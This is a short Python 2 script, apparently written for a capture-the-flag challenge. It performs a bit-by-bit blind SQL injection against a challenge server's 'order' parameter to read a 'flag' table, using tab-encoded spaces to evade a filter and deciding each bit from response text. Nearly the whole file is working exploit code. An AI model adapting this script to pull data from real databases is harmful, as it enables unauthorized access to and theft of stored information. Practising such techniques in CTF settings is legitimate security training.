#!/usr/bin/env python
# coding: UTF-8 （๑•̀ㅂ•́)و✧
__author__ = ''

import string
import requests
import time

# url = 'http://ctf.hit.edu.cn:3004/user.php?id=3-(if(ascii(substr(user,1,1)),2,1))'
HEADERS = {
    "Host": "127.0.0.1:80",
    "User-Agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
    "Connection": "keep-alive",
}
payloads = 'abcdefghijklmnopqrstuvwxyz!@%()<>?{}_/1234,56.7890 -'
res = ''
NULL_flag=0
strings=''
for i in range(10, 45):
    check_flag=0
    res=''

    for j in ["1","2","4","8","16","32","64"]:
        print '--------------------'+j
        #url="http://58.154.33.13:8003/?order=if((select%09ascii(mid((select%09(flag)%09from%09(flag)%09limit%090,1),"+str(i)+",1))&"+j+"),(select%091%09union%09select%092),1)"
        #url="http://58.154.33.13:8003/?order=if((select%09ascii(mid((select%09flag%09from%09flag),1,1))%26(0)),(select(1)union%09select(2)),1)"
        url="http://58.154.33.13:8003/?order=if((select%09ascii(mid((select%09flag%09from%09flag),"+str(i)+",1))%26"+j+"),(select(1)union%09select(2)),1)"
        print url
        r = requests.get(url=url)
        print r.content


        if 'Sam' in r.content:
            #print payload
            res += '0'
            print res

        elif 'Hacker' in r.content:
            print 'WAF!'
            exit()
        else:
            res+='1'
            #print res,

    if len(res)==7:
        #res=chr(int(res))
        strings+=chr(int(res[::-1],2))
        print 'str: '+strings





